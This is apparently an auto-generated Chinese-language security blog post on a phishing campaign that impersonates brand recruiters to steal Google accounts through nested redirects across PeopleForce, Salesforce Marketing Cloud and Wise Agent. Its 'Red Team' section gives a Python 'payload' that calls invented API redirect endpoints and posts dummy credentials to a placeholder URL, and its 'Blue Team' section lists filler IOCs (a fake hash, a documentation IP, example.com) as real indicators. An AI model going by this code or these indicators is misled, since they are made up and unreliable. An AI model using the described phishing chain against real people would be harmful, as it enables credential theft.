---
layout: post
title:  "Phishing poses as big-brand job interview to steal Google accounts"
date:   2026-07-07 02:26:32 +0000
categories: [security]
severity: high
---

# 🔥 解析高級品牌冒充的 Google 帳戶盜取攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Credential Theft (憑證竊取)
> * **關鍵技術**: Phishing, Nested Redirects, Browser-in-the-Browser (BitB)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用合法的雲端人力資源平台 (PeopleForce) 和 Salesforce Marketing Cloud 服務，創建了一個複雜的重定向鏈，最終導致受害者進入一個惡意的登陸頁面。
* **攻擊流程圖解**:
  1. 攻擊者發送一封假的招聘郵件，冒充知名品牌的招聘人員。
  2. 郵件中包含一個連結，指向 PeopleForce 平台。
  3. PeopleForce 平台重定向到 Salesforce Marketing Cloud 服務。
  4. Salesforce Marketing Cloud 服務重定向到 Wise Agent (wiseagent[.]com) 雲端房地產 CRM 軟件。
  5. Wise Agent 軟件重定向到惡意的登陸頁面。
* **受影響元件**: Google 帳戶、PeopleForce 平台、Salesforce Marketing Cloud 服務、Wise Agent 軟件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個合法的 PeopleForce 平台帳戶和 Salesforce Marketing Cloud 服務帳戶。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意的登陸頁面 URL
    malicious_landing_page = "https://example.com/malicious-landing-page"
    
    # 定義 PeopleForce 平台的 API 端點
    peopleforce_api_endpoint = "https://api.peopleforce.com/v1/redirect"
    
    # 定義 Salesforce Marketing Cloud 服務的 API 端點
    salesforce_api_endpoint = "https://api.salesforce.com/v1/redirect"
    
    # 定義 Wise Agent 軟件的 API 端點
    wise_agent_api_endpoint = "https://api.wiseagent.com/v1/redirect"
    
    # 創建一個惡意的登陸頁面
    response = requests.post(malicious_landing_page, data={"username": "victim", "password": "password"})
    
    # 重定向到 PeopleForce 平台
    response = requests.get(peopleforce_api_endpoint, params={"redirect_uri": salesforce_api_endpoint})
    
    # 重定向到 Salesforce Marketing Cloud 服務
    response = requests.get(salesforce_api_endpoint, params={"redirect_uri": wise_agent_api_endpoint})
    
    # 重定向到 Wise Agent 軟件
    response = requests.get(wise_agent_api_endpoint, params={"redirect_uri": malicious_landing_page})
    
    ```
* **繞過技術**: 攻擊者可以使用 Browser-in-the-Browser (BitB) 技術，創建一個假的 Google 登陸頁面，讓受害者輸入憑證。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /malicious-landing-page |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule phishing_email {
      meta:
        description = "Phishing email detection"
        author = "Your Name"
      strings:
        $email_subject = "Job Opportunity"
        $email_body = "Please click on the link to schedule a conversation"
      condition:
        $email_subject and $email_body
    }
    
    ```
* **緩解措施**: 使用安全的郵件客戶端，啟用兩步 驗證，使用強密碼，避免點擊可疑連結。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing (網釣)**: 想像一個釣魚者，使用假的魚餌來吸引受害者。技術上是指使用假的電子郵件或網頁來竊取受害者的憑證。
* **Nested Redirects (嵌套重定向)**: 想像一個俄羅斯套娃，裡面有多個重定向鏈。技術上是指使用多個重定向鏈來導致受害者進入一個惡意的網頁。
* **Browser-in-the-Browser (BitB)**: 想像一個假的瀏覽器，裡面有多個假的網頁。技術上是指使用假的瀏覽器來創建一個假的登陸頁面。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/phishing-poses-as-big-brand-job-interview-to-steal-google-accounts/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1566/)


